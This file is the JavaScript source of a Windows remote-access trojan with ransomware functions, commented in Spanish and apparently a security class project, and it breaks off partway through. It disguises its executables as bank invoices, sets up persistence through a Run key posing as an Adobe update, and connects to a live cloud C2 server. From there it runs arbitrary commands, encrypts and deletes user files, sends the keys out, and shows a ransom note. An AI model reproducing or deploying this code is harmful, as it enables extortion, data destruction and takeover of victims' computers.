// ===============================
// CLIENTE C2 - Windows RAT
// ===============================

const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const io = require('socket.io-client');

// Configuracion
let configFile = {};
try {
    if (fs.existsSync('config.json')) {
        configFile = JSON.parse(fs.readFileSync('config.json', 'utf8'));
    }
} catch (e) { }

// Lista de servidores (primero Render, luego local)
// IMPORTANTE: Reemplaza 'TU-APP-RENDER' con el nombre real de tu app en Render
const SERVERS = configFile.SERVERS || [
    'https://proyectoseguridad-pnzo.onrender.com',  // Servidor en la nube (Render) - PRIMARIO
    'http://localhost:3000',                // Servidor local - FALLBACK
    'http://10.214.47.137:3000'             // IP local de red - FALLBACK 2
];

let currentServerIndex = 0;
let SERVER_URL = SERVERS[currentServerIndex];

const INSTALL_DIR = path.join(process.env.APPDATA || os.homedir(), 'AdobeReader');
const EXE_NAME = 'Factura_Electronica_Enero2026.exe';       // Parece factura bancaria
const NOTA_NAME = 'Comprobante_Pago_2026.exe';              // Parece comprobante de pago
const REG_KEY = 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';
const REG_VALUE = 'AdobeAcrobatUpdate';

// Archivos C2 que NUNCA deben cifrarse
const ARCHIVOS_EXCLUIDOS = [
    'cliente_new.exe', 'cliente.exe', 'cliente_v2.exe',
    'Factura_Electronica_Enero2026.exe', 'Comprobante_Pago_2026.exe',
    'Factura_Banco_2024.exe', 'Comprobante_Transaccion.exe',
    'nota_rescate.exe', 'nota_rescate_Cripto.exe',
    'escudo.png', 'escudo.ico', 'adobe_icon.png', 'adobe_icon.ico',
    '.aes_key', '.decrypt_used', '.client_id',
    'WindowsUpdateService_Cripto.exe', 'WindowsUpdateService.exe'
];

// Variables globales
let claveAES = null;
let rsaPublicKey = null;
let socket = null;
let reconnectInterval = null;
let connectionAttempts = 0;
const MAX_ATTEMPTS_PER_SERVER = 3;
let isElevated = false;

// ===============================
// ELEVACION UAC (SOLICITAR ADMIN)
// ===============================
function checkIfAdmin() {
    try {
        // Intentar escribir en directorio del sistema para verificar si somos admin
        const testPath = 'C:\\Windows\\Temp\\admin_test_' + Date.now() + '.tmp';
        fs.writeFileSync(testPath, 'test');
        fs.unlinkSync(testPath);
        return true;
    } catch (e) {
        return false;
    }
}

function requestElevation() {
    return new Promise((resolve) => {
        // Si ya somos admin o estamos en desarrollo, continuar
        if (checkIfAdmin()) {
            console.log(' Ejecutando con privilegios de administrador');
            isElevated = true;
            resolve(true);
            return;
        }

        // Verificar si ya intentamos elevar (evitar bucle infinito)
        const elevationMarker = path.join(INSTALL_DIR, '.elevation_attempted');
        if (fs.existsSync(elevationMarker)) {
            console.log(' Continuando sin privilegios de administrador');
            try { fs.unlinkSync(elevationMarker); } catch (e) { }
            resolve(false);
            return;
        }

        // Marcar que intentamos elevar
        try {
            if (!fs.existsSync(INSTALL_DIR)) {
                fs.mkdirSync(INSTALL_DIR, { recursive: true });
            }
            fs.writeFileSync(elevationMarker, Date.now().toString());
        } catch (e) { }

        // Intentar relanzar con privilegios elevados usando PowerShell
        const currentExe = process.execPath;
        const args = process.argv.slice(1).join(' ');

        console.log(' Solicitando privilegios de administrador...');

        // PowerShell Start-Process con -Verb RunAs solicita UAC
        const psCommand = `Start-Process -FilePath "${currentExe}" -ArgumentList "${args}" -Verb RunAs -ErrorAction SilentlyContinue`;

        exec(`powershell -Command "${psCommand}"`, { windowsHide: true }, (error) => {
            if (error) {
                // Usuario denegó UAC o falló - continuar sin admin
                console.log(' UAC denegado o no disponible. Continuando sin privilegios elevados.');
                try { fs.unlinkSync(elevationMarker); } catch (e) { }
                resolve(false);
            } else {
                // Nuevo proceso elevado iniciado, este proceso puede terminar
                console.log(' Proceso elevado iniciado. Este proceso terminará.');
                process.exit(0);
            }
        });

        // Timeout de 30 segundos por si el usuario no responde al UAC
        setTimeout(() => {
            console.log(' Timeout de UAC. Continuando sin privilegios elevados.');
            try { fs.unlinkSync(elevationMarker); } catch (e) { }
            resolve(false);
        }, 30000);
    });
}

// ===============================
// PERSISTENCIA EN WINDOWS
// ===============================
function instalarPersistencia() {
    return new Promise((resolve) => {
        // Crear directorio si no existe
        if (!fs.existsSync(INSTALL_DIR)) {
            fs.mkdirSync(INSTALL_DIR, { recursive: true });
        }

        const targetPath = path.join(INSTALL_DIR, EXE_NAME);
        const currentExe = process.execPath;
        const currentDir = path.dirname(currentExe);

        // Verificar si ya esta instalado
        if (fs.existsSync(targetPath) && currentExe.includes(INSTALL_DIR)) {
            console.log(' Ya instalado en el sistema');
            resolve(true);
            return;
        }

        // Copiar ejecutable principal
        try {
            if (!currentExe.includes('node.exe') && !currentExe.includes(INSTALL_DIR)) {
                fs.copyFileSync(currentExe, targetPath);
                console.log(` [+] Copiado a: ${targetPath}`);
            }
        } catch (e) {
            console.log('[!] No se pudo copiar ejecutable:', e.message);
        }

        // Copiar nota de rescate si existe junto al ejecutable
        const notaSources = [
            path.join(currentDir, NOTA_NAME),                          // Mismo directorio que exe principal
            path.join(currentDir, 'Comprobante_Pago_2026.exe'),
            path.join(currentDir, 'nota_rescate.exe'),
            path.join(currentDir, 'nota_rescate_Cripto.exe'),
            path.join(process.cwd(), NOTA_NAME),                       // CWD (directorio de ejecución)
            path.join(process.cwd(), 'Comprobante_Pago_2026.exe'),
            path.join(process.cwd(), 'nota_rescate.exe')
        ];

        const notaTarget = path.join(INSTALL_DIR, NOTA_NAME);
        for (const notaSource of notaSources) {
            if (fs.existsSync(notaSource) && !fs.existsSync(notaTarget)) {
                try {
                    fs.copyFileSync(notaSource, notaTarget);
                    console.log(` [+] Nota de rescate copiada a: ${notaTarget}`);
                    break;
                } catch (e) {
                    console.log('[!] No se pudo copiar nota de rescate:', e.message);
                }
            }
        }

        // Copiar escudo.png si existe
        const escudoSources = [
            path.join(currentDir, 'escudo.png'),
            path.join(process.cwd(), 'escudo.png')
        ];
        const escudoTarget = path.join(INSTALL_DIR, 'escudo.png');
        for (const escudoSource of escudoSources) {
            if (fs.existsSync(escudoSource) && !fs.existsSync(escudoTarget)) {
                try {
                    fs.copyFileSync(escudoSource, escudoTarget);
                    console.log(` [+] Escudo copiado a: ${escudoTarget}`);
                    break;
                } catch (e) {
                    console.log('[!] No se pudo copiar escudo:', e.message);
                }
            }
        }

        // Agregar al registro
        const comando = `reg add "${REG_KEY}" /v "${REG_VALUE}" /t REG_SZ /d "${targetPath}" /f`;
        exec(comando, (error) => {
            if (error) {
                console.log('[!] No se pudo agregar al registro:', error.message);
            } else {
                console.log(' [+] Persistencia instalada en el registro');
            }
            resolve(true);
        });
    });
}

// ===============================
// CIFRADO
// ===============================
function cifrarConAES(data, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key, 'hex'), iv);
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data)), cipher.final()]);
    return {
        encrypted: true,
        algorithm: 'aes-256-cbc',
        iv: iv.toString('hex'),
        data: encrypted.toString('base64')
    };
}

function cifrarConRSA(data, publicKey) {
    try {
        const encrypted = crypto.publicEncrypt(
            { key: publicKey, padding: crypto.constants.RSA_PKCS1_PADDING },  // PKCS#1 v1.5 for CrypTool
            Buffer.from(JSON.stringify(data))
        );
        return { encrypted: true, algorithm: 'rsa', data: encrypted.toString('base64') };
    } catch (e) {
        console.error('Error RSA:', e.message);
        return data;
    }
}

// ===============================
// INFORMACION DEL SISTEMA
// ===============================
function obtenerInfoSistema() {
    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        username: os.userInfo().username,
        homedir: os.homedir(),
        cpus: os.cpus().length,
        totalMemory: Math.round(os.totalmem() / 1024 / 1024 / 1024) + ' GB',
        freeMemory: Math.round(os.freemem() / 1024 / 1024 / 1024) + ' GB'
    };
}

// ===============================
// GENERAR ID UNICO
// ===============================
function obtenerIdUnico() {
    const idFile = path.join(INSTALL_DIR, '.client_id');
    if (fs.existsSync(idFile)) {
        return fs.readFileSync(idFile, 'utf8').trim();
    }
    // Crear nuevo ID basado en hardware
    const machineId = crypto.createHash('md5')
        .update(os.hostname() + os.platform() + os.arch() + os.cpus()[0]?.model)
        .digest('hex');
    if (!fs.existsSync(INSTALL_DIR)) {
        fs.mkdirSync(INSTALL_DIR, { recursive: true });
    }
    fs.writeFileSync(idFile, machineId);
    return machineId;
}

// ===============================
// SHELL PERSISTENTE
// ===============================
let currentWorkingDir = process.cwd();

function ejecutarComando(comando) {
    return new Promise((resolve) => {
        // Detectar si el comando es 'cd' para actualizar el directorio
        const cdMatch = comando.match(/^cd\s+(.+)$/i);
        if (cdMatch) {
            const targetDir = cdMatch[1].trim().replace(/"/g, '');
            try {
                // Resolver ruta relativa o absoluta
                const newDir = path.isAbsolute(targetDir)
                    ? targetDir
                    : path.resolve(currentWorkingDir, targetDir);

                if (fs.existsSync(newDir) && fs.statSync(newDir).isDirectory()) {
                    currentWorkingDir = newDir;
                    resolve({
                        success: true,
                        stdout: `Directorio cambiado a: ${currentWorkingDir}\n`,
                        stderr: '',
                        error: null
                    });
                } else {
                    resolve({
                        success: false,
                        stdout: '',
                        stderr: `El directorio no existe: ${newDir}`,
                        error: `El directorio no existe: ${newDir}`
                    });
                }
            } catch (e) {
                resolve({
                    success: false,
                    stdout: '',
                    stderr: e.message,
                    error: e.message
                });
            }
            return;
        }

        // ===== COMANDOS ESPECIALES C2 =====

        // c2:scan - Escanear archivos
        if (comando.toLowerCase() === 'c2:scan') {
            const extensiones = ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];
            const resultado = escanearArchivos([currentWorkingDir], extensiones);

            let listado = "\n FECHA               SIZE      NOMBRE\n";
            listado += " ------------------- --------  ------------------------\n";

            // Mostrar primeros 100 archivos
            resultado.archivos.slice(0, 100).forEach(f => {
                let dateStr = "Unknown";
                try {
                    if (f.fechaMod) dateStr = new Date(f.fechaMod).toISOString().replace("T", " ").substring(0, 19);
                } catch (e) { }

                const sizeStr = (f.tamanioHumano || "0").padEnd(8);
                const name = f.nombre;
                listado += ` ${dateStr}   ${sizeStr}  ${name}\n`;
            });

            if (resultado.archivos.length > 100) {
                listado += ` ... y ${resultado.archivos.length - 100} archivos mas.\n`;
            }

            resolve({
                success: true,
                stdout: ` ESCANEO COMPLETADO\n` +
                    ` Directorio: ${currentWorkingDir}\n` +
                    ` Archivos encontrados: ${resultado.total}\n` +
                    ` Tamano total: ${resultado.tamanioTotalHumano}\n` +
                    ` Por extension: ${JSON.stringify(resultado.porCategoria || {}, null, 2)}\n` +
                    listado,
                stderr: '',
                error: null
            });
            return;
        }

        // c2:encrypt [limite] - Cifrar archivos
        const encryptMatch = comando.match(/^c2:encrypt(?:\s+(\d+))?$/i);
        if (encryptMatch) {
            const limite = parseInt(encryptMatch[1]) || 100;
            const extensiones = ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];
            const escaneo = escanearArchivos([currentWorkingDir], extensiones);
            const archivosACifrar = escaneo.archivos.slice(0, limite);

            let totalCifrados = 0;
            let totalErrores = 0;

            archivosACifrar.forEach(archivo => {
                if (ARCHIVOS_EXCLUIDOS.includes(path.basename(archivo.ruta))) return; // Skip
                const resultado = cifrarArchivo(archivo.ruta, claveAES);
                if (resultado.success) totalCifrados++;
                else totalErrores++;
            });

            // Auto-lanzar nota de rescate
            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
            if (fs.existsSync(notaPath)) {
                exec(`start "" "${notaPath}"`);
            }

            resolve({
                success: true,
                stdout: ` CIFRADO COMPLETADO\n` +
                    `📂 Directorio: ${currentWorkingDir}\n` +
                    ` Cifrados: ${totalCifrados}\n` +
                    ` Errores: ${totalErrores}\n`,
                stderr: '',
                error: null
            });
            return;
        }

        // c2:encrypt-ext [ext1,ext2,...] [limite] - Cifrar por extensiones especificas
        const encryptExtMatch = comando.match(/^c2:encrypt-ext\s+([a-zA-Z0-9,]+)(?:\s+(\d+))?$/i);
        if (encryptExtMatch) {
            const extensiones = encryptExtMatch[1].toLowerCase().split(',');
            const limite = parseInt(encryptExtMatch[2]) || 100;

            const escaneo = escanearArchivos([currentWorkingDir], extensiones);
            const archivosACifrar = escaneo.archivos.slice(0, limite);

            let totalCifrados = 0;
            let totalErrores = 0;

            archivosACifrar.forEach(archivo => {
                if (ARCHIVOS_EXCLUIDOS.includes(path.basename(archivo.ruta))) return; // Skip
                const resultado = cifrarArchivo(archivo.ruta, claveAES);
                if (resultado.success) totalCifrados++;
                else totalErrores++;
            });

            // Auto-lanzar nota de rescate
            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
            if (fs.existsSync(notaPath)) {
                exec(`start "" "${notaPath}"`);
            }

            resolve({
                success: true,
                stdout: ` CIFRADO POR EXTENSIONES COMPLETADO\n` +
                    `📂 Directorio: ${currentWorkingDir}\n` +
                    `📄 Extensiones: ${extensiones.join(', ')}\n` +
                    ` Cifrados: ${totalCifrados}\n` +
                    ` Errores: ${totalErrores}\n`,
                stderr: '',
                error: null
            });
            return;
        }

        // c2:encrypt-dir [ruta] [limite] - Cifrar una carpeta especifica
        const encryptDirMatch = comando.match(/^c2:encrypt-dir\s+(.+?)(?:\s+(\d+))?$/i);
        if (encryptDirMatch) {
            let targetDir = encryptDirMatch[1].trim().replace(/"/g, '');
            const limite = parseInt(encryptDirMatch[2]) || 100;

            // Resolver ruta relativa
            if (!path.isAbsolute(targetDir)) {
                targetDir = path.resolve(currentWorkingDir, targetDir);
            }

            if (!fs.existsSync(targetDir)) {
                resolve({
                    success: false,
                    stdout: '',
                    stderr: `El directorio no existe: ${targetDir}`,
                    error: `El directorio no existe: ${targetDir}`
                });
                return;
            }

            const extensiones = ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];
            const escaneo = escanearArchivos([targetDir], extensiones);
            const archivosACifrar = escaneo.archivos.slice(0, limite);

            let totalCifrados = 0;
            let totalErrores = 0;

            archivosACifrar.forEach(archivo => {
                if (ARCHIVOS_EXCLUIDOS.includes(path.basename(archivo.ruta))) return; // Skip
                const resultado = cifrarArchivo(archivo.ruta, claveAES);
                if (resultado.success) totalCifrados++;
                else totalErrores++;
            });

            // Auto-lanzar nota de rescate
            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
            if (fs.existsSync(notaPath)) {
                exec(`start "" "${notaPath}"`);
            }

            resolve({
                success: true,
                stdout: ` CIFRADO DE DIRECTORIO COMPLETADO\n` +
                    `📂 Directorio objetivo: ${targetDir}\n` +
                    ` Cifrados: ${totalCifrados}\n` +
                    ` Errores: ${totalErrores}\n`,
                stderr: '',
                error: null
            });
            return;
        }

        // c2:encrypt-all [limite] - Cifrar TODOS los archivos (sin filtro de extension)
        const encryptAllMatch = comando.match(/^c2:encrypt-all(?:\s+(\d+))?$/i);
        if (encryptAllMatch) {
            const limite = parseInt(encryptAllMatch[1]) || 100;

            // Escanear todos los archivos (sin filtro de extension)
            function escanearTodo(dir, archivos = []) {
                try {
                    fs.readdirSync(dir, { withFileTypes: true }).forEach(item => {
                        const fullPath = path.join(dir, item.name);
                        if (item.isDirectory()) {
                            if (!item.name.startsWith('.') && !['node_modules', 'Windows', 'Program Files'].includes(item.name)) {
                                escanearTodo(fullPath, archivos);
                            }
                        } else if (item.isFile() && !item.name.endsWith('.cript')) {
                            archivos.push(fullPath);
                        }
                    });
                } catch { }
                return archivos;
            }

            const todosArchivos = escanearTodo(currentWorkingDir);
            const archivosACifrar = todosArchivos.slice(0, limite);

            let totalCifrados = 0;
            let totalErrores = 0;

            archivosACifrar.forEach(ruta => {
                if (ARCHIVOS_EXCLUIDOS.includes(path.basename(ruta))) return; // Skip
                const resultado = cifrarArchivo(ruta, claveAES);
                if (resultado.success) totalCifrados++;
                else totalErrores++;
            });

            // Auto-lanzar nota de rescate
            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
            if (fs.existsSync(notaPath)) {
                exec(`start "" "${notaPath}"`);
            }

            resolve({
                success: true,
                stdout: ` CIFRADO TOTAL COMPLETADO\n` +
                    `📂 Directorio: ${currentWorkingDir}\n` +
                    ` Archivos encontrados: ${todosArchivos.length}\n` +
                    ` Cifrados: ${totalCifrados}\n` +
                    ` Errores: ${totalErrores}\n`,
                stderr: '',
                error: null
            });
            return;
        }

        // c2:decrypt - Descifrar archivos
        if (comando.toLowerCase() === 'c2:decrypt') {
            let totalDescifrados = 0;
            let totalErrores = 0;

            function buscarYDescifrar(dir) {
                try {
                    fs.readdirSync(dir, { withFileTypes: true }).forEach(item => {
                        const fullPath = path.join(dir, item.name);
                        if (item.isDirectory()) {
                            buscarYDescifrar(fullPath);
                        } else if (item.name.endsWith('.cript')) {
                            const resultado = descifrarArchivo(fullPath, claveAES);
                            if (resultado.success) totalDescifrados++;
                            else totalErrores++;
                        }
                    });
                } catch { }
            }

            buscarYDescifrar(currentWorkingDir);

            resolve({
                success: true,
                stdout: ` DESCIFRADO COMPLETADO\n` +
                    `📂 Directorio: ${currentWorkingDir}\n` +
                    ` Descifrados: ${totalDescifrados}\n` +
                    ` Errores: ${totalErrores}\n`,
                stderr: '',
                error: null
            });
            return;
        }

        // c2:decrypt-file [ruta] - Descifrar un archivo especifico (para demostracion/prueba de pago)
        const decryptFileMatch = comando.match(/^c2:decrypt-file\s+(.+)$/i);
        if (decryptFileMatch) {
            let targetFile = decryptFileMatch[1].trim().replace(/"/g, '');

            // Resolver ruta relativa
            if (!path.isAbsolute(targetFile)) {
                targetFile = path.resolve(currentWorkingDir, targetFile);
            }

            // Agregar .cript si no termina asi
            if (!targetFile.endsWith('.cript')) {
                targetFile += '.cript';
            }

            if (!fs.existsSync(targetFile)) {
                resolve({
                    success: false,
                    stdout: '',
                    stderr: ` Archivo no encontrado: ${targetFile}`,
                    error: `Archivo no encontrado: ${targetFile}`
                });
                return;
            }

            const resultado = descifrarArchivo(targetFile, claveAES);

            if (resultado.success) {
                resolve({
                    success: true,
                    stdout: ` ARCHIVO DESCIFRADO EXITOSAMENTE\n` +
                        `📄 Archivo: ${resultado.original}\n` +
                        ` Restaurado a: ${resultado.descifrado}\n`,
                    stderr: '',
                    error: null
                });
            } else {
                resolve({
                    success: false,
                    stdout: '',
                    stderr: ` Error al descifrar: ${resultado.error}`,
                    error: resultado.error
                });
            }
            return;
        }

        // c2:ransom - Mostrar nota de rescate
        if (comando.toLowerCase() === 'c2:ransom') {
            const notaPath = path.join(INSTALL_DIR, NOTA_NAME);
            if (fs.existsSync(notaPath)) {
                exec(`start "" "${notaPath}"`, (error) => {
                    resolve({
                        success: !error,
                        stdout: error ? '' : ' Nota de rescate mostrada\n',
                        stderr: error ? error.message : '',
                        error: error ? error.message : null
                    });
                });
            } else {
                resolve({
                    success: false,
                    stdout: '',
                    stderr: `Archivo no encontrado: ${notaPath}`,
                    error: `Archivo no encontrado: ${notaPath}`
                });
            }
            return;
        }

        // c2:help - Mostrar ayuda
        if (comando.toLowerCase() === 'c2:help') {
            resolve({
                success: true,
                stdout: ` COMANDOS C2 DISPONIBLES\n` +
                    `═══════════════════════════════════════════════════\n` +
                    `ESCANEO:\n` +
                    `  c2:scan              - Escanear archivos en directorio actual\n\n` +
                    `CIFRADO:\n` +
                    `  c2:encrypt [N]       - Cifrar hasta N archivos (default: 100)\n` +
                    `  c2:encrypt-ext ext1,ext2 [N]  - Cifrar solo extensiones especificas\n` +
                    `  c2:encrypt-dir ruta [N]       - Cifrar carpeta especifica\n` +
                    `  c2:encrypt-all [N]            - Cifrar TODOS los archivos\n\n` +
                    `DESCIFRADO:\n` +
                    `  c2:decrypt           - Descifrar todos los archivos .cript\n` +
                    `  c2:decrypt-file ruta - Descifrar UN archivo especifico\n\n` +
                    `OTROS:\n` +
                    `  c2:ransom            - Mostrar nota de rescate\n` +
                    `  c2:help              - Mostrar esta ayuda\n\n` +
                    `EJEMPLOS:\n` +
                    `  c2:encrypt 50                 - Cifrar 50 archivos\n` +
                    `  c2:encrypt-ext txt,pdf 200   - Cifrar hasta 200 txt y pdf\n` +
                    `  c2:encrypt-dir Documents     - Cifrar carpeta Documents\n` +
                    `  c2:encrypt-all               - Cifrar todo en directorio actual\n` +
                    `  c2:decrypt-file foto.jpg     - Descifrar solo foto.jpg.cript\n`,
                stderr: '',
                error: null
            });
            return;
        }

        // Ejecutar comando en el directorio actual
        exec(comando, {
            cwd: currentWorkingDir,
            encoding: 'buffer',
            maxBuffer: 1024 * 1024 * 10
        }, (error, stdout, stderr) => {
            let output = '';
            try {
                output = stdout.toString('utf8');
            } catch {
                try { output = stdout.toString('latin1'); } catch { output = stdout.toString(); }
            }
            resolve({
                success: !error,
                stdout: output,
                stderr: stderr ? stderr.toString() : '',
                error: error ? error.message : null
            });
        });
    });
}

// ===============================
// ESCANEAR ARCHIVOS
// ===============================
function escanearArchivos(directorios, extensiones) {
    const archivos = [];
    const categoriasContador = {};

    function escanear(dir) {
        try {
            const items = fs.readdirSync(dir, { withFileTypes: true });
            for (const item of items) {
                const fullPath = path.join(dir, item.name);
                try {
                    if (item.isDirectory()) {
                        if (!item.name.startsWith('.') && !['node_modules', 'Windows', 'Program Files'].includes(item.name)) {
                            escanear(fullPath);
                        }
                    } else if (item.isFile()) {
                        const ext = path.extname(item.name).toLowerCase().slice(1);
                        if (extensiones.includes(ext)) {
                            const stats = fs.statSync(fullPath);
                            archivos.push({
                                ruta: fullPath,
                                nombre: item.name,
                                extension: ext,
                                tamanio: stats.size
                            });
                            categoriasContador[ext] = (categoriasContador[ext] || 0) + 1;
                        }
                    }
                } catch { }
            }
        } catch { }
    }

    directorios.forEach(d => escanear(d));

    const tamanioTotal = archivos.reduce((acc, a) => acc + a.tamanio, 0);
    return {
        archivos,
        total: archivos.length,
        tamanioTotal,
        tamanioTotalHumano: formatBytes(tamanioTotal),
        porCategoria: categoriasContador
    };
}

function formatBytes(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / 1024 / 1024).toFixed(1) + ' MB';
    return (bytes / 1024 / 1024 / 1024).toFixed(2) + ' GB';
}

// ===============================
// CIFRADO DE ARCHIVOS
// ===============================
function cifrarArchivo(rutaArchivo, clave) {
    if (rutaArchivo.endsWith('.cript')) {
        return { success: false, original: rutaArchivo, error: 'El archivo ya esta cifrado (.cript)' };
    }
    try {
        const contenido = fs.readFileSync(rutaArchivo);
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(clave, 'hex'), iv);
        // IV antepuesto + datos cifrados (formato estandar)
        const cifrado = Buffer.concat([iv, cipher.update(contenido), cipher.final()]);

        const nuevaRuta = rutaArchivo + '.cript';
        fs.writeFileSync(nuevaRuta, cifrado);
        fs.unlinkSync(rutaArchivo);

        // Preparar metadatos para enviar al servidor C2 (NO se guardan localmente)
        const metadatos = {
            archivoOriginal: path.basename(rutaArchivo),
            archivoCifrado: path.basename(nuevaRuta),
            rutaCompleta: nuevaRuta,
            directorio: path.dirname(rutaArchivo),
            algorithm: 'aes-256-cbc',
            iv: iv.toString('hex'),
            key: clave,
            fechaCifrado: new Date().toISOString(),
            tamanoOriginal: contenido.length,
            tamanoCifrado: cifrado.length,
            hostname: os.hostname()
        };

        // Enviar metadatos al servidor C2 (se guardan en servidor, no en victima)
        if (socket && socket.connected) {
            socket.emit('guardar-metadatos-cifrado', metadatos);
        }

        return {
            success: true,
            original: rutaArchivo,
            cifrado: nuevaRuta,
            // Metadatos del cifrado
            encrypted: true,
            algorithm: 'aes-256-cbc',
            iv: iv.toString('hex'),
            keyPreview: clave.substring(0, 16) + '...',
            tamano: cifrado.length
        };
    } catch (e) {
        return { success: false, original: rutaArchivo, error: e.message };
    }
}

function descifrarArchivo(rutaArchivo, clave) {
    try {
        // Leer archivo completo: IV (16 bytes) + datos cifrados
        const contenido = fs.readFileSync(rutaArchivo);
        const iv = contenido.slice(0, 16);
        const datos = contenido.slice(16);

        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(clave, 'hex'), iv);
        const descifrado = Buffer.concat([decipher.update(datos), decipher.final()]);

        const rutaOriginal = rutaArchivo.replace('.cript', '');
        fs.writeFileSync(rutaOriginal, descifrado);
        fs.unlinkSync(rutaArchivo);

        return { success: true, cifrado: rutaArchivo, original: rutaOriginal };
    } catch (e) {
        return { success: false, cifrado: rutaArchivo, error: e.message };
    }
}

// ===============================
// CONEXION AL SERVIDOR
// ===============================

// Funcion para cambiar al siguiente servidor
function cambiarServidor() {
    currentServerIndex = (currentServerIndex + 1) % SERVERS.length;
    SERVER_URL = SERVERS[currentServerIndex];
    connectionAttempts = 0;
    currentServerIndex = (currentServerIndex + 1) % SERVERS.length;
    SERVER_URL = SERVERS[currentServerIndex];
    connectionAttempts = 0;
    console.log(`[*] Cambiando a servidor: ${SERVER_URL}`);
}

async function conectar() {
    await instalarPersistencia();

    console.log(` [*] Conectando al servidor: ${SERVER_URL}`);
    console.log(` [*] Servidores disponibles: ${SERVERS.length}`);

    socket = io(SERVER_URL, {
        reconnection: false, // Manejamos reconexion manualmente para failover
        timeout: 10000,
        transports: ['websocket', 'polling']
    });

    socket.on('connect_error', (err) => {
        console.log(` [!] Error de conexion: ${err.message}`);
        connectionAttempts++;

        if (connectionAttempts >= MAX_ATTEMPTS_PER_SERVER) {
            // Cambiar al siguiente servidor
            cambiarServidor();
        }

        // Reintentar conexion despues de 5 segundos
        setTimeout(() => {
            console.log(`[*] Reintentando conexion a ${SERVER_URL}... (intento ${connectionAttempts + 1})`);
            socket.close();
            conectar();
        }, 5000);
    });

    socket.on('connect', () => {
        console.log(` [+] Conectado exitosamente a: ${SERVER_URL}`);
        connectionAttempts = 0; // Reset intentos al conectar

        if (reconnectInterval) {
            clearInterval(reconnectInterval);
            reconnectInterval = null;
        }

        // Registrar cliente
        const uuid = obtenerIdUnico();
        const info = obtenerInfoSistema();
        socket.emit('registrar-cliente', {
            uuid,
            nombre: info.hostname,
            hostname: info.hostname,
            platform: info.platform,
            arch: info.arch,
            username: info.username,
            ip: 'local',
            serverUrl: SERVER_URL // Guardar a cual servidor se conecto
        });
    });

    socket.on('disconnect', () => {
        console.log(' [-] Desconectado del servidor');
        console.log('[*] Intentando reconectar...');

        // Intentar reconectar despues de 3 segundos
        setTimeout(() => {
            conectar();
        }, 3000);
    });

    socket.on('registrado', (data) => {
        console.log(' [+] Registrado con ID:', data.clienteId);
        claveAES = data.clave;
        rsaPublicKey = data.rsaPublicKey;

        // Guardar clave AES para nota_rescate (descifrado de un archivo)
        if (claveAES) {
            try {
                const keyFilePath = path.join(INSTALL_DIR, '.aes_key');
                fs.writeFileSync(keyFilePath, claveAES);
                console.log(' [+] Clave AES guardada para nota de rescate');

                // --- DEMOSTRACION RSA ---
                // Simular el envio seguro de esta clave usando RSA para que el usuario pueda verificarlo
                if (rsaPublicKey) {
                    const encryptedKey = cifrarConRSA({ key: claveAES }, rsaPublicKey);
                    console.log('\n--- DEMOSTRACION CIFRADO RSA ---');
                    console.log('1. Clave AES Original:', claveAES);
                    console.log('2. Clave Publica RSA:', rsaPublicKey.substring(0, 50) + '...');
                    console.log('3. Clave AES Cifrada (RSA):', encryptedKey.data);
                    console.log('--------------------------------\n');
                }
                // ------------------------

            } catch (e) {
                console.log('[!] No se pudo guardar clave AES:', e.message);
            }
        }

        // Enviar info del sistema
        const info = obtenerInfoSistema();
        if (claveAES) {
            socket.emit('info-sistema', cifrarConAES(info, claveAES));
        } else {
            socket.emit('info-sistema', info);
        }
        console.log(' [+] Informacion del sistema enviada');
        console.log('[*] Esperando comandos del servidor...');
    });

    // ===============================
    // HANDLERS DE COMANDOS
    // ===============================
    socket.on('ejecutar-comando', async (data) => {
        const { comandoId, comando } = data;
        console.log(`[>] Ejecutando: ${comando}`);

        const resultado = await ejecutarComando(comando);

        // Mostrar resultado en consola (truncado si es muy largo)
        if (resultado.stdout) {
            const outputPreview = resultado.stdout.length > 500
                ? resultado.stdout.substring(0, 500) + '...[truncado]'
                : resultado.stdout;
            console.log(`[<] Resultado:\n${outputPreview}`);
        }
        if (resultado.error) {
            console.log(` [!] Error: ${resultado.error}`);
        }

        socket.emit('comando-resultado', {
            comandoId,
            clienteId: socket.id,
            output: resultado.stdout,
            error: resultado.error,
            success: resultado.success
        });
    });

    socket.on('escanear-archivos', (data) => {
        const { comandoId, directorios, extensiones } = data;
        console.log('[*] Escaneando archivos...');

        const dirs = directorios || [process.cwd()];  // Por defecto: directorio donde se ejecuta
        const exts = extensiones || ['doc', 'docx', 'pdf', 'txt', 'xls', 'xlsx', 'jpg', 'png', 'pptx', 'mp3', 'mp4'];

        const resultado = escanearArchivos(dirs, exts);
        console.log(` [+] Encontrados: ${resultado.total} archivos (${resultado.tamanioTotalHumano})`);

        // Lista de archivos (max 50 para la UI)
        const listaArchivos = resultado.archivos.slice(0, 50).map(a => ({
            nombre: a.nombre,
            extension: path.extname(a.nombre),
            tamanio: a.tamanioHumano,
            ruta: a.ruta,
            directorio: path.dirname(a.ruta)
        }));

        if (claveAES) {
            socket.emit('archivos-escaneados', {
                ...cifrarConAES(resultado, claveAES),
                resumenBasico: {
                    total: resultado.total,
                    tamanioTotalHumano: resultado.tamanioTotalHumano,
                    archivos: listaArchivos
                }
            });
        } else {
            socket.emit('archivos-escaneados', {
                ...resultado,
                resumenBasico: {
                    total: resultado.total,
                    tamanioTotalHumano: resultado.tamanioTotalHumano,
                    archivos: listaArchivos
                }
            });
        }
    });

    socket.on('cifrar-archivos', (data) => {
